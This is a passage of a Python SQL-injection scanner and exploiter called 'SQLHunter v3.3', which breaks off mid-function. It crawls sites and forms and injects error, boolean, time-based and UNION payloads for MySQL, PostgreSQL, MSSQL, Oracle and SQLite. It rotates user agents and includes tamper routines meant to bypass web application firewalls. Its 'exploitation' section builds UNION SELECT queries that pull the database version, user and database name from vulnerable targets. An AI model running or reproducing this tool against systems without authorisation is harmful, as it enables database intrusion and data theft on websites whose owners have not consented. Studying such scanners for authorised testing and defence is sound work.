#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLHunter v3.3 - Advanced SQL Injection Scanner (Single-file, pro+ex)
Developer: sudo0x57 (adapted)
"""
# ==============================================================================
#                                1. IMPORTS
# ==============================================================================
import os
import sys
import json
import time
import re
import logging
import random
import argparse
import threading
from typing import Dict, List, Tuple, Optional, Any, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote
from datetime import datetime
from dataclasses import dataclass
from pathlib import Path
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

# Third-party imports
try:
    import requests
    from bs4 import BeautifulSoup
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    import difflib
    import colorama
    from tqdm import tqdm
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    colorama.init()
except ImportError as e:
    print(
        "FATAL: Missing required library. Please run:\n"
        "  pip install requests beautifulsoup4 urllib3 colorama tqdm\n"
        f"Details: {e}"
    )
    sys.exit(1)

# ==============================================================================
#                             2. GLOBALS & CONFIG
# ==============================================================================
VULNERABILITIES: List[Dict[str, Any]] = []
VULN_KEYS: Set[Tuple[str, str, str, str]] = set()  # (method,url,param,reason) for dedup
BASE_RESPONSES: Dict[str, 'ResponseFingerprint'] = {}

VERSION = "3.3"
AUTHOR = "sudo0x57"
TOOL_NAME = "SQLHunter"

HOME_DIR = Path.home()
CONFIG_DIR = HOME_DIR / ".config" / "sqlhunter"
LOGS_DIR = CONFIG_DIR / "logs"
REPORTS_DIR = CONFIG_DIR / "reports"
CACHE_DIR = CONFIG_DIR / "cache"
RESPONSES_DIR = CONFIG_DIR / "responses"
CONFIG_DIR.mkdir(parents=True, exist_ok=True)
LOGS_DIR.mkdir(exist_ok=True)
REPORTS_DIR.mkdir(exist_ok=True)
CACHE_DIR.mkdir(exist_ok=True)
RESPONSES_DIR.mkdir(exist_ok=True)

LOG_FILE = LOGS_DIR / f"sqlhunter_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(TOOL_NAME)

DEFAULT_CONFIG: Dict[str, Any] = {
    "timeout": 20,
    "threads": 20,
    "param_threads": 6,
    "delay": 0.05,
    "max_urls": 1000,
    "verify_ssl": True,
    "user_agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/114.0 Safari/537.36"
    ),
    "proxy": None,
    "follow_redirects": True,
    "report_format": "html,json,csv",
    "detection_threshold": 0.90,
    "progress_bar": True,
    "silent": False,
    "no_color": False,
    "random_user_agents": True,
    "rotate_ua_per_request": False,
    "max_retries": 3,
    "save_responses": False,
    "export_curl": False,
    "blind_timeout": 8,
    "cache_results": True,
    "cache_ttl": 86400,
    # Crawl
    "crawl": False,
    "max_pages": 50,
    "same_domain_only": True,
    # Headers & WAF
    "custom_headers": {},
    "waf_bypass": False,
    # Rate limit
    "rate_limit_rps": None,
    # Filters
    "include_params": None,
    "exclude_params": None,
    "max_params_per_url": None,
    # Exploitation
    "exploit": False,
    "exploit_max_cols": 8,
    "exploit_marker": "SQLHX",
    "stop_on_first": True,
}


def load_config() -> Dict[str, Any]:
    cfg_path = CONFIG_DIR / "config.json"
    if cfg_path.exists():
        try:
            data = json.loads(cfg_path.read_text(encoding='utf-8'))
            for k, v in DEFAULT_CONFIG.items():
                data.setdefault(k, v)
            return data
        except Exception as e:
            logger.warning(f"Config file error: {e}. Using defaults.")
    save_config(DEFAULT_CONFIG)
    return DEFAULT_CONFIG.copy()


def save_config(config_data: Dict[str, Any]) -> None:
    cfg_path = CONFIG_DIR / "config.json"
    try:
        cfg_path.write_text(json.dumps(config_data, indent=4, ensure_ascii=False), encoding='utf-8')
    except Exception as e:
        logger.error(f"Failed to save config: {e}")


config = load_config()

BANNER_ASCII = (
    "            ___ _  _ ____ _  _ ____ ___  __  \n"
    " ___ ___ _ / __| || | ___| || | ___| _ \\/ _|\n"
    "(_-<(_-< ' \\__ \\ __ | _|| __ | _||   / (_ \n"
    "/__/___/_||_|___/_||_|_| |_||_|_| |_|_\\___/\n"
)

BANNER_COLOR = (
    "\033[1;36m            ___ _  _ ____ _  _ ____ ___  __  \033[0m\n"
    "\033[1;32m ___ ___ _ / __| || | ___| || | ___| _ \\/ _|\033[0m\n"
    "\033[1;33m(_-<(_-< ' \\__ \\ __ | _|| __ | _||   / (_ \033[0m\n"
    "\033[1;31m/__/___/_||_|___/_||_|_| |_||_|_| |_|_\\___/\033[0m\n"
)


def banner_text(no_color: bool = False) -> str:
    head = BANNER_ASCII if no_color else BANNER_COLOR
    tail = f"      {TOOL_NAME} ~ by {AUTHOR}        v{VERSION}\n"
    if not no_color:
        tail = f"\033[1;37m{tail}\033[0m"
    return head + tail

# ==============================================================================
#                                3. DATA CLASSES
# ==============================================================================
@dataclass
class ResponseFingerprint:
    status: int
    length: int
    time: float
    text: str

    @classmethod
    def from_response(cls, resp: requests.Response) -> 'ResponseFingerprint':
        return cls(
            status=getattr(resp, 'status_code', 0),
            length=len(getattr(resp, 'content', b"") or b""),
            time=(getattr(getattr(resp, 'elapsed', None), 'total_seconds', lambda: 0.0)() if resp is not None else 0.0),
            text=getattr(resp, 'text', '') or "",
        )

    def similarity(self, other: 'ResponseFingerprint') -> float:
        try:
            return difflib.SequenceMatcher(None, self.text, other.text).ratio()
        except Exception:
            return 0.0


@dataclass
class Form:
    action: str
    method: str
    inputs: Dict[str, str]


# ==============================================================================
#                                4. UI HELPERS
# ==============================================================================

def print_banner():
    if not config.get('silent'):
        print(banner_text(config.get('no_color', False)))
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = f"    [+] Scan started at: {ts}\n"
        if not config.get('no_color', False):
            msg = f"    \033[32m[+] Scan started at: {ts}\033[0m\n"
        print(msg)


def progress_bar(iterable, desc=None, total=None, **kwargs):
    if config.get('progress_bar', True) and not config.get('silent', False):
        return tqdm(iterable, desc=desc, total=total, **kwargs)
    return iterable


def print_result(url: str, param: str, payload: str, detection: str, rt: float, method: str = "GET"):
    if config.get('silent'):
        return
    print(f"\n\033[1;31m[!] VULNERABLE ({method}):\033[0m {url}")
    print(f"    \033[33m -> Parameter:\033[0m {param}")
    print(f"    \033[36m -> Payload:\033[0m {payload}")
    print(f"    \033[35m -> Detection:\033[0m {detection}")
    print(f"    \033[34m -> Response Time:\033[0m {rt:.2f}s\n")


# ==============================================================================
#                              5. RATE LIMITER & CACHE
# ==============================================================================
class RateLimiter:
    def __init__(self, rps: Optional[float]):
        self.rps = rps
        self.lock = threading.Lock()
        self.next_time = 0.0

    def wait(self):
        if not self.rps or self.rps <= 0:
            return
        with self.lock:
            now = time.time()
            if now < self.next_time:
                time.sleep(self.next_time - now)
                now = time.time()
            interval = 1.0 / self.rps
            self.next_time = now + interval


class _Elapsed:
    def __init__(self, seconds: float):
        self._s = seconds
    def total_seconds(self) -> float:
        return self._s


class CachedResponse:
    def __init__(self, url: str, status_code: int, text: str, content: bytes, elapsed: float):
        self.url = url
        self.status_code = status_code
        self.text = text
        self.content = content
        self.elapsed = _Elapsed(elapsed)


# ==============================================================================
#                              6. SESSION MANAGER
# ==============================================================================
class SessionManager:
    def __init__(self):
        self.session = requests.Session()
        self._setup()
        self._rate = RateLimiter(config.get('rate_limit_rps'))
        self._cache: Dict[Tuple, Tuple[float, CachedResponse]] = {}
        self._cache_lock = threading.Lock()

    def _setup(self):
        if config.get('random_user_agents', True):
            self.session.headers.update({"User-Agent": self._random_ua()})
        else:
            self.session.headers.update({"User-Agent": config['user_agent']})
        if isinstance(config.get('custom_headers'), dict) and config['custom_headers']:
            self.session.headers.update(config['custom_headers'])
        if config.get('proxy'):
            self.session.proxies.update({'http': config['proxy'], 'https': config['proxy']})
            self.session.verify = False
        if not config.get('verify_ssl', True):
            self.session.verify = False
        retry = Retry(
            total=config.get('max_retries', 3),
            backoff_factor=0.5,
            status_forcelist=[408, 429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS"]
        )
        # Larger connection pool for higher concurrency
        adapter = HTTPAdapter(max_retries=retry, pool_connections=max(10, config.get('threads', 20)), pool_maxsize=max(20, config.get('threads', 20) * 2))
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    def _random_ua(self) -> str:
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/114.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        ]
        return random.choice(uas)

    def _cache_key(self, method: str, url: str, data: Optional[Dict[str, Any]]) -> Tuple:
        if data is None:
            return (method.upper(), url, None)
        try:
            items = tuple(sorted((str(k), str(v)) for k, v in data.items()))
        except Exception:
            items = (str(data),)
        return (method.upper(), url, items)

    def _get_cached(self, key: Tuple) -> Optional[CachedResponse]:
        if not config.get('cache_results'):
            return None
        now = time.time()
        ttl = config.get('cache_ttl', 86400)
        with self._cache_lock:
            entry = self._cache.get(key)
            if not entry:
                return None
            ts, resp = entry
            if now - ts > ttl:
                del self._cache[key]
                return None
            return resp

    def _set_cache(self, key: Tuple, resp: requests.Response, method: str, data: Optional[Dict[str, Any]]):
        if not config.get('cache_results') or resp is None:
            return
        if method.upper() != 'GET' or data is not None:
            return
        try:
            cr = CachedResponse(getattr(resp, 'url', ''), getattr(resp, 'status_code', 0), getattr(resp, 'text', '') or '', getattr(resp, 'content', b'') or b'', getattr(getattr(resp, 'elapsed', None), 'total_seconds', lambda: 0.0)())
            with self._cache_lock:
                self._cache[key] = (time.time(), cr)
        except Exception:
            pass

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._rate.wait()
        if config.get('rotate_ua_per_request'):
            self.session.headers.update({"User-Agent": self._random_ua()})
        time.sleep(config.get('delay', 0))
        data = kwargs.get('data') if method.upper() in ("POST", "PUT", "PATCH") else None
        key = self._cache_key(method, url, data)
        cached = self._get_cached(key)
        if cached is not None:
            return cached
        try:
            resp = self.session.request(
                method,
                url,
                timeout=config.get('timeout', 20),
                allow_redirects=config.get('follow_redirects', True),
                **kwargs,
            )
            self._set_cache(key, resp, method, data)
            return resp
        except requests.RequestException as e:
            logger.debug(f"{method} request failed for {url}: {e}")
            return None


session_mgr = SessionManager()

# ==============================================================================
#                              7. PAYLOADS & TAMPER
# ==============================================================================

def load_default_payloads() -> List[Dict[str, Any]]:
    return [
        # Error-based
        {"payload": "'", "type": "error"},
        {"payload": '"', "type": "error"},
        {"payload": "')--", "type": "error"},
        {"payload": '")--', "type": "error"},
        {"payload": "')#", "type": "error"},
        {"payload": "OR 1=1--", "type": "error"},
        {"payload": "' OR 1=1--", "type": "error"},
        {"payload": '" OR 1=1--', "type": "error"},

        # Boolean-based
        {"payload": "' OR '1'='1'--", "type": "boolean"},
        {"payload": '" OR "1"="1"--', "type": "boolean"},
        {"payload": "1 OR 1=1--", "type": "boolean"},
        {"payload": "') OR ('a'='a", "type": "boolean"},

        # Time-based
        {"payload": "' AND SLEEP(5)--", "type": "time", "db": "mysql"},
        {"payload": "' AND IF(1=1,SLEEP(5),0)--", "type": "time", "db": "mysql"},
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "type": "time", "db": "mssql"},
        {"payload": "' || (SELECT pg_sleep(5))--", "type": "time", "db": "postgresql"},
        {"payload": "'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "type": "time", "db": "oracle"},

        # UNION-based (string style)
        {"payload": "' UNION SELECT NULL--", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL--", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL--", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", "type": "union"},

        # UNION-based (numeric style)
        {"payload": "0 UNION SELECT NULL--", "type": "union"},
        {"payload": "0 UNION SELECT NULL,NULL--", "type": "union"},
        {"payload": "0 UNION SELECT NULL,NULL,NULL--", "type": "union"},
    ]


def load_payloads_from_file(path: str) -> Optional[List[Dict[str, Any]]]:
    try:
        text = Path(path).read_text(encoding='utf-8')
        try:
            data = json.loads(text)
            payloads: List[Dict[str, Any]] = []
            if isinstance(data, list):
                for item in data:
                    if isinstance(item, str):
                        payloads.append({"payload": item, "type": "error"})
                    elif isinstance(item, dict) and 'payload' in item:
                        payloads.append({"payload": str(item['payload']), "type": str(item.get('type', 'error'))})
            return payloads
        except json.JSONDecodeError:
            payloads = [{"payload": line.strip(), "type": "error"} for line in text.splitlines() if line.strip()]
            return payloads
    except Exception as e:
        logger.error(f"Failed to load payloads from {path}: {e}")
        return None


def merge_payloads(base: List[Dict[str, Any]], extra: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Merge two payload lists, deduplicating by (payload,type)."""
    seen: Set[Tuple[str, str]] = set()
    out: List[Dict[str, Any]] = []
    for lst in (base, extra):
        for item in lst or []:
            p = str(item.get('payload', ''))
            t = str(item.get('type', 'error'))
            key = (p, t)
            if p and key not in seen:
                seen.add(key)
                out.append({"payload": p, "type": t, **({k: v for k, v in item.items() if k not in ('payload', 'type')})})
    return out


def _toggle_case(s: str) -> str:
    out = []
    upper = True
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            out.append(ch)
    return ''.join(out)


def _inline_comment(payload: str) -> str:
    patterns = [r"(?i)select", r"(?i)union", r"(?i)from", r"(?i)where", r"(?i)and", r"(?i)or"]
    out = payload
    for pat in patterns:
        out = re.sub(pat, lambda m: f"/*{m.group(0)}*/", out)
    return out


def tamper_variants(payload: str) -> List[str]:
    variants = [payload]
    try:
        variants.append(quote(payload, safe=''))
    except Exception:
        pass
    variants.append(_toggle_case(payload))
    variants.append(_inline_comment(payload))
    uniq = []
    for v in variants:
        if v not in uniq:
            uniq.append(v)
    return uniq[:4]


SQL_ERRORS = re.compile(
    r"(" \
    r"sql syntax|mysql_fetch|mysql_num_rows|pg_query|unterminated|syntax error|ORA-\d+|ODBC SQL|SQLServer|SQLiteException|\\bWarning:\\b.*\\bmysql\\b|Microsoft OLE DB Provider|You have an error in your SQL syntax" \
    r")",
    re.IGNORECASE | re.MULTILINE,
)


# ==============================================================================
#                              8. HELPERS
# ==============================================================================

def normalize_url(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url


def get_params(url: str) -> Dict[str, List[str]]:
    q = urlparse(url).query
    return parse_qs(q, keep_blank_values=True)


def set_param(url: str, key: str, value: str) -> str:
    parsed = urlparse(url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    query[key] = [value]
    new_query = urlencode([(k, v) for k, vs in query.items() for v in vs])
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


def export_curl(method: str, url: str, headers: Dict[str, str] = None, data: Dict[str, Any] = None) -> str:
    parts = ["curl", "-X", method.upper()]
    hdrs = dict(session_mgr.session.headers)
    if headers:
        hdrs.update(headers)
    for k, v in hdrs.items():
        parts += ["-H", f"{k}: {v}"]
    if data is not None:
        for k, v in data.items():
            parts += ["-F", f"{k}={v}"]
    if not config.get('verify_ssl', True):
        parts.append("--insecure")
    if config.get('proxy'):
        parts += ["--proxy", str(config['proxy'])]
    parts.append(url)
    return " ".join(parts)


def _match_param_filters(param: str) -> bool:
    inc = config.get('include_params')
    exc = config.get('exclude_params')
    if inc:
        try:
            if not re.search(inc, param):
                return False
        except re.error:
            pass
    if exc:
        try:
            if re.search(exc, param):
                return False
        except re.error:
            pass
    return True


def waf_indicators(resp: Optional[requests.Response]) -> Optional[str]:
    if not resp:
        return None
    text = (resp.text or '')[:2000]
    headers = {k.lower(): v for k, v in getattr(resp, 'headers', {}).items()}
    patterns = [
        r"cloudflare|attention required|ray id",
        r"access denied|request blocked|malicious request",
        r"akamai|incapsula|imperva|sucuri|mod_security|modsecurity",
        r"bot protection|waf|web application firewall",
    ]
    for pat in patterns:
        if re.search(pat, text, re.I) or any(re.search(pat, v, re.I) for v in headers.values()):
            return pat
    if getattr(resp, 'status_code', 200) in (403, 406, 429):
        return f"status:{resp.status_code}"
    return None


# ==============================================================================
#                              9. DETECTION LOGIC
# ==============================================================================
@dataclass
class DetectResult:
    vulnerable: bool
    reason: str
    elapsed: float
    payload: str
    method: str
    db_hint: Optional[str] = None
    snippet: Optional[str] = None


def baseline_fingerprint_request(method: str, url: str, data: Optional[Dict[str, Any]] = None) -> Optional[ResponseFingerprint]:
    resp = session_mgr.request(method, url, data=data) if method.upper() == 'POST' else session_mgr.request(method, url)
    if not resp:
        return None
    return ResponseFingerprint.from_response(resp)


def detect_error_based(resp: Optional[requests.Response]) -> Tuple[bool, Optional[str]]:
    if not resp:
        return False, None
    text = getattr(resp, 'text', '') or ""
    if SQL_ERRORS.search(text):
        if re.search(r"mysql|MariaDB", text, re.I):
            db = "mysql"
        elif re.search(r"PostgreSQL|pg_", text, re.I):
            db = "postgresql"
        elif re.search(r"ORA-\d+|Oracle", text, re.I):
            db = "oracle"
        elif re.search(r"SQL Server|ODBC|MSSQL", text, re.I):
            db = "mssql"
        elif re.search(r"SQLite", text, re.I):
            db = "sqlite"
        else:
            db = None
        return True, db
    return False, None


def detect_boolean_based(base: Optional[ResponseFingerprint], resp: Optional[requests.Response]) -> bool:
    if not resp or not base:
        return False
    test_fp = ResponseFingerprint.from_response(resp)
    # Compare only a trimmed portion for speed and normalize whitespace to avoid noise
    base_text = re.sub(r"\s+", " ", base.text[:800]) if base.text else ""
    test_text = re.sub(r"\s+", " ", test_fp.text[:800]) if test_fp.text else ""
    try:
        sim = difflib.SequenceMatcher(None, base_text, test_text).ratio()
    except Exception:
        sim = base.similarity(test_fp)
    return sim < config.get('detection_threshold', 0.9)


def _derive_false_variant(true_payload: str) -> Optional[str]:
    p = true_payload
    # Simple flips for common patterns
    repl = [
        (r"(?i)\b1\s*=\s*1\b", "1=2"),
        (r"(?i)\b'\s*1'\s*=\s*'1'\b", "'1'='2'"),
        (r"(?i)\b" + '"1"\s*=\s*"1"' + r"\b", '"1"="2"'),
        (r"(?i)\b'a'\s*=\s*'a'\b", "'a'='b'"),
        (r"(?i)\btrue\b", "false"),
        (r"(?i)\b'\s*or\s*'1'='1\b", "' AND '1'='2"),
    ]
    out = p
    changed = False
    for pat, to in repl:
        new_out = re.sub(pat, to, out)
        if new_out != out:
            out = new_out
            changed = True
    if not changed:
        # Generic flip: try replace OR with AND and equality to inequality
        out2 = re.sub(r"(?i)\bor\b", "AND", out)
        out2 = re.sub(r"=", "!=", out2)
        if out2 != p:
            return out2
        return None
    return out


def detect_boolean_pair(base: Optional[ResponseFingerprint], resp_true: Optional[requests.Response], resp_false: Optional[requests.Response]) -> bool:
    if not base or not resp_true or not resp_false:
        return False
    fp_t = ResponseFingerprint.from_response(resp_true)
    fp_f = ResponseFingerprint.from_response(resp_false)
    sim_t = base.similarity(fp_t)
    sim_f = base.similarity(fp_f)
    thr = config.get('detection_threshold', 0.9)
    # True should diverge, False should resemble baseline
    return (sim_t < thr) and (sim_f >= thr or sim_f > sim_t)


def detect_time_based(start: float, end: float, baseline: Optional[float] = None) -> bool:
    elapsed = end - start
    threshold = max(5, config.get('blind_timeout', 8))
    if baseline is not None and baseline > 0:
        # Require elapsed significantly larger than baseline to reduce noise
        return elapsed >= max(threshold, baseline * 2.5)
    return elapsed >= threshold


def _baseline_timing(method: str, url: str, data: Optional[Dict[str, Any]]) -> Optional[float]:
    t0 = time.time()
    _ = session_mgr.request(method, url, data=data) if data else session_mgr.request(method, url)
    t1 = time.time()
    return t1 - t0


def _confirm_time_based(method: str, url: str, data: Optional[Dict[str, Any]]) -> bool:
    base = _baseline_timing(method, url, data)
    t0 = time.time()
    resp = session_mgr.request(method, url, data=data) if data else session_mgr.request(method, url)
    t1 = time.time()
    _ = waf_indicators(resp)
    return detect_time_based(t0, t1, base)


def _test_one_get(in_url: str, param: str, base_fp: ResponseFingerprint, payload: str) -> Optional[DetectResult]:
    inj_url = set_param(in_url, param, payload)
    t0 = time.time()
    resp = session_mgr.request("GET", inj_url)
    t1 = time.time()
    waf = waf_indicators(resp)
    ok, db = detect_error_based(resp)
    snippet = (getattr(resp, 'text', '') or '')[:400] if resp else None
    if ok:
        return DetectResult(True, "error-based" + ("/waf" if waf else ""), t1 - t0, payload, "GET", db, snippet)
    # Enhanced boolean: try a "false" variant to reduce false positives
    if detect_boolean_based(base_fp, resp):
        false_variant = _derive_false_variant(payload)
        if false_variant:
            resp_false = session_mgr.request("GET", set_param(in_url, param, false_variant))
            if detect_boolean_pair(base_fp, resp, resp_false):
                return DetectResult(True, "boolean-based" + ("/waf" if waf else ""), t1 - t0, payload, "GET", None, snippet)
        else:
            return DetectResult(True, "boolean-based" + ("/waf" if waf else ""), t1 - t0, payload, "GET", None, snippet)
    if detect_time_based(t0, t1):
        if _confirm_time_based('GET', inj_url, None):
            return DetectResult(True, "time-based" + ("/waf" if waf else ""), t1 - t0, payload, "GET", None, snippet)
    return None


def _test_one_post(action_url: str, param: str, base_fp: ResponseFingerprint, base_form: Dict[str, Any], payload: str) -> Optional[DetectResult]:
    data = dict(base_form)
    data[param] = payload
    t0 = time.time()
    resp = session_mgr.request("POST", action_url, data=data)
    t1 = time.time()
    waf = waf_indicators(resp)
    ok, db = detect_error_based(resp)
    snippet = (getattr(resp, 'text', '') or '')[:400] if resp else None
    if ok:
        return DetectResult(True, "error-based" + ("/waf" if waf else ""), t1 - t0, payload, "POST", db, snippet)
    if detect_boolean_based(base_fp, resp):
        false_variant = _derive_false_variant(payload)
        if false_variant:
            data_false = dict(base_form)
            data_false[param] = false_variant
            resp_false = session_mgr.request("POST", action_url, data=data_false)
            if detect_boolean_pair(base_fp, resp, resp_false):
                return DetectResult(True, "boolean-based" + ("/waf" if waf else ""), t1 - t0, payload, "POST", None, snippet)
        else:
            return DetectResult(True, "boolean-based" + ("/waf" if waf else ""), t1 - t0, payload, "POST", None, snippet)
    if detect_time_based(t0, t1):
        if _confirm_time_based('POST', action_url, data):
            return DetectResult(True, "time-based" + ("/waf" if waf else ""), t1 - t0, payload, "POST", None, snippet)
    return None


def test_param_get(url: str, param: str, base_fp: ResponseFingerprint, payloads: List[Dict[str, Any]]) -> List[DetectResult]:
    findings: List[DetectResult] = []
    for p in payloads:
        candidates = [p["payload"]]
        if config.get('waf_bypass'):
            candidates = tamper_variants(p["payload"]) or candidates
        detected = None
        for variant in candidates:
            res = _test_one_get(url, param, base_fp, variant)
            if res:
                detected = res
                break
        if detected:
            findings.append(detected)
            if config.get('stop_on_first', True):
                break
    return findings


def test_param_post(action_url: str, param: str, base_fp: ResponseFingerprint, base_form: Dict[str, Any], payloads: List[Dict[str, Any]]) -> List[DetectResult]:
    findings: List[DetectResult] = []
    for p in payloads:
        candidates = [p["payload"]]
        if config.get('waf_bypass'):
            candidates = tamper_variants(p["payload"]) or candidates
        detected = None
        for variant in candidates:
            res = _test_one_post(action_url, param, base_fp, base_form, variant)
            if res:
                detected = res
                break
        if detected:
            findings.append(detected)
            if config.get('stop_on_first', True):
                break
    return findings


# ==============================================================================
#                              10. PAGE PARSING
# ==============================================================================

def extract_forms(html: str, base_url: str) -> List[Form]:
    forms: List[Form] = []
    soup = BeautifulSoup(html or "", "html.parser")
    for f in soup.find_all('form'):
        action = f.get('action') or ''
        method = (f.get('method') or 'get').strip().upper()
        inputs: Dict[str, str] = {}
        for inp in f.find_all(['input', 'textarea', 'select']):
            name = inp.get('name')
            if not name:
                continue
            val = inp.get('value') or ''
            inputs[name] = val
        action_abs = urljoin(base_url, action) if action else base_url
        forms.append(Form(action_abs, method, inputs))
    return forms


_SKIP_EXTS = {'.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico', '.css', '.js', '.pdf', '.zip', '.rar', '.7z', '.mp4', '.mp3', '.woff', '.woff2', '.ttf', '.eot'}

def extract_links(html: str, base_url: str) -> List[str]:
    urls: List[str] = []
    soup = BeautifulSoup(html or "", "html.parser")
    for tag in soup.find_all(['a', 'link', 'script', 'img']):
        href = tag.get('href') or tag.get('src')
        if not href:
            continue
        if href.startswith('javascript:'):
            continue
        abs_url = urljoin(base_url, href)
        path = urlparse(abs_url).path.lower()
        if any(path.endswith(ext) for ext in _SKIP_EXTS):
            continue
        urls.append(abs_url)
    return urls


# ==============================================================================
#                              11. LOGIN FLOW
# ==============================================================================

def _parse_kv_string(kv: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for part in (kv or '').split('&'):
        if not part:
            continue
        if '=' in part:
            k, v = part.split('=', 1)
            out[k.strip()] = v.strip()
    return out


def perform_login(login_url: Optional[str], login_data: Optional[str], login_json: Optional[str], csrf_param: Optional[str], csrf_regex: Optional[str]) -> None:
    if not login_url:
        return
    login_url = normalize_url(login_url)
    token_val: Optional[str] = None
    if csrf_param:
        r = session_mgr.request('GET', login_url)
        if r and getattr(r, 'text', ''):
            html = r.text
            try:
                soup = BeautifulSoup(html, 'html.parser')
                el = soup.find('input', {'name': csrf_param})
                if el and el.get('value'):
                    token_val = el.get('value')
            except Exception:
                pass
            if not token_val and csrf_regex:
                m = re.search(csrf_regex, html, re.I)
                if m:
                    token_val = m.group(1) if m.groups() else m.group(0)
    data: Dict[str, Any] = {}
    if login_json:
        try:
            if os.path.exists(login_json):
                data = json.loads(Path(login_json).read_text(encoding='utf-8'))
            else:
                data = json.loads(login_json)
        except Exception as e:
            logger.warning(f"login-json parse failed: {e}")
    elif login_data:
        data = _parse_kv_string(login_data)
    if csrf_param and token_val is not None:
        data[csrf_param] = token_val
    if not data:
        logger.warning("Login requested but no data provided.")
        return
    resp = session_mgr.request('POST', login_url, data=data)
    if resp is None or getattr(resp, 'status_code', 0) >= 400:
        logger.warning("Login may have failed. Continue anyway.")
    else:
        logger.info("Login performed (status %s)." % getattr(resp, 'status_code', '?'))


# ==============================================================================
#                              12. SEVERITY & RECORDING HELPERS
# ==============================================================================

_SEVERITY = {
    'error-based': 'high',
    'boolean-based': 'medium',
    'time-based': 'medium',
}

def _severity(reason: str) -> str:
    for k, v in _SEVERITY.items():
        if reason.startswith(k):
            return v
    return 'info'


def _save_response_artifact(prefix: str, content: str) -> str:
    fname = f"{prefix}_{int(time.time()*1000)}.txt"
    path = RESPONSES_DIR / fname
    try:
        path.write_text(content, encoding='utf-8', errors='ignore')
        return str(path)
    except Exception:
        return ''


# ==============================================================================
#                              13. EXPLOITATION (UNION)
# ==============================================================================

@dataclass
class ExploitOutcome:
    success: bool
    style: Optional[str] = None  # 'num' or 'str'
    columns: int = 0
    text_index: int = 0
    details: Dict[str, Any] = None


def _is_numeric(val: str) -> bool:
    return bool(re.fullmatch(r"-?\d+", str(val or '').strip()))


def _order_by_payload(style: str, n: int) -> str:
    if style == 'num':
        return f"0 ORDER BY {n}--"
    else:
        return f"' ORDER BY {n}--"


def _union_select_payload(style: str, columns: int, expr_pos: int, expr: str) -> str:
    cols = ["NULL"] * columns
    cols[expr_pos - 1] = expr
    cols_str = ",".join(cols)
    if style == 'num':
        return f"0 UNION SELECT {cols_str}--"
    else:
        return f"' UNION SELECT {cols_str}--"


def _db_exprs(db: Optional[str], marker: str) -> Dict[str, str]:
    if db == 'postgresql':
        return {
            'version': f"'" + marker + "' || version() || '" + marker + "'",
            'user': f"'" + marker + "' || current_user || '" + marker + "'",
            'db': f"'" + marker + "' || current_database() || '" + marker + "'",
        }
    if db == 'mssql':
        return {
            'version': f"'" + marker + "' + @@version + '" + marker + "'",
            'user': f"'" + marker + "' + SYSTEM_USER + '" + marker + "'",
            'db': f"'" + marker + "' + DB_NAME() + '" + marker + "'",
        }
    if db == 'oracle':
        return {
            'version': f"'" + marker + "' || (SELECT banner FROM v$version WHERE ROWNUM=1) || '" + marker + "'",
            'user': f"'" + marker + "' || user || '" + marker + "'",
            'db': f"'" + marker + "' || (SELECT name FROM v$database) || '" + marker + "'",
        }
    if db == 'sqlite':
        return {
            'version': f"'" + marker + "' || sqlite_version() || '" + marker + "'",
            'user': f"'" + marker + "' || 'sqlite' || '" + marker + "'",
            'db': f"'" + marker + "' || 'main' || '" + marker + "'",
        }
    return {
        'version': f"CONCAT('{marker}',@@version,'{marker}')",
        'user': f"CONCAT('{marker}',USER(),'{marker}')",
        'db': f"CONCAT('{marker}',DATABASE(),'{marker}')",
    }


def _extract_between(text: str, marker: str) -> Optional[str]:
    if not text:
        return None
    m = re.search(re.escape(marker) + r"(.*?)" + re.escape(marker), text, re.S)
    if m:
        return m.group(1).strip()
    return None


def _find_columns(method: str, url: str, param: str, style: str, base_fp: ResponseFingerprint, max_cols: int) -> int:
    last_ok = 0
    for n in range(1, max_cols + 1):
        payload = _order_by_payload(style, n)
        if method == 'GET':
            test_url = set_param(url, param, payload)
            resp = session_mgr.request('GET', test_url)
        else:
            raise NotImplementedError
        if not resp:
            break
        # If adding ORDER BY n triggers error or large diff, we likely exceeded columns
        if SQL_ERRORS.search(resp.text or '') or detect_boolean_based(base_fp, resp):
